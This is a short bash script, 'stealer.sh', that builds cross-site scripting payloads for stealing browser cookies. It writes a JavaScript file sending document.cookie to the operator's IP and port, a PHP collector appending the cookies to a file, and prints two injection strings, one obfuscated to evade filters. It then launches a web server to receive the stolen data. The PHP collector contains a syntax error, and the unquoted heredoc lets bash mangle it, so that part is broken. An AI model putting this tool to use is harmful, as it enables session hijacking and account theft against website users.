#!/bin/bash

function usage() {
    cat << EOF
Usage: $0 <Your_IP> <Your_PORT>

Options:
  -h, --help   Show this help message and exit

Description:
  This script host a simple web server and create payloads for capturing cookies.

Steps:
  1. Just provide your IP and port
  2. Run the script like :-  bash stealer.sh IP PORT
EOF
}

if [[ "$1" == "-h" || "$1" == "--help" ]]; then
    usage
    exit 0
fi

if [[ $# -ne 2 ]]; then
    echo "Error: Missing Your IP address or port."
    usage
    exit 1
fi

IP="$1"
PORT="$2"

BLUE='\033[1;34m'
RED='\033[1;31m'
GREEN='\033[1;32m'
NC='\033[0m'

mkdir web-server
 
echo "[+] Write JS Payloads "
cat > 0xmr.js << EOF
var img = new Image();
img.src = "http://$IP:$PORT/0xmr.php?c=" + document.cookie;
EOF

echo "[+] Write PHP Payload"
cat > 0xmr.php << EOF
<?php
file_put_contents("cookies.txt", $_GET['c']). "\n", FILE_APPEND);
?>
EOF







echo "        [  Payload  ] "
echo -e "${RED}📨 Use this Payloads:${NC}"
echo "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
echo -e "     "
echo -e "<script src="http://$IP:$PORT/0xmr.js"></script>"
echo -e "     "
echo -e '<IMG src=x onerror=eval("fet"+"ch('http://$IP:$PORT/?c='+document.coo"+"kie)") >'
echo -e "     "
echo "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"

echo  -e "${RED} [+] Starting WEB SERVER on port $PORT...${NC}"
echo -e "${NC} "
sudo python3 -m http.server $PORT
